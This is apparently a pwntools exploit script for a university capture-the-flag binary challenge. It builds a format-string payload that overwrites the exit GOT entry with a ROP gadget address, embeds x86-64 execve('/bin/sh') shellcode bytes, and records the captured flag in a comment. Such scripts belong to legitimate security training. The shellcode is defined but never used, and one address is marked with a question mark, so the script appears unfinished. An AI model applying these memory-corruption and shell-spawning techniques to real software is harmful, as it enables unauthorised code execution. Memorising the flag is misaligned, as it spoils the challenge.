from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99x.cs.ui.ac.id', 20004
LOCAL = True
DEBUG = True
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *main+83
        b *main+124
        b *main+129
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')
exit_got = 0x601038   #?
printf_got = 0x601020
poprdi = 0x0000000000400773

shellcode = b'''
\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
'''

dummy = b'A' * (256)
payload = b'%*8$x'
payload += b'%9$hn'
payload += b'\x00' * (16 - len(payload))
payload += p64(poprdi & 0xFFF)
payload += p64(exit_got)
p.sendline(payload)

if LOCAL:
    print(p.recvall())
    pause()
else:
    print(p.recvall().decode())  # CSCE604258{lE81h_$Us4h_MaN@_BIkIN_5o@1_4p@_peCAHKAn_So4l}
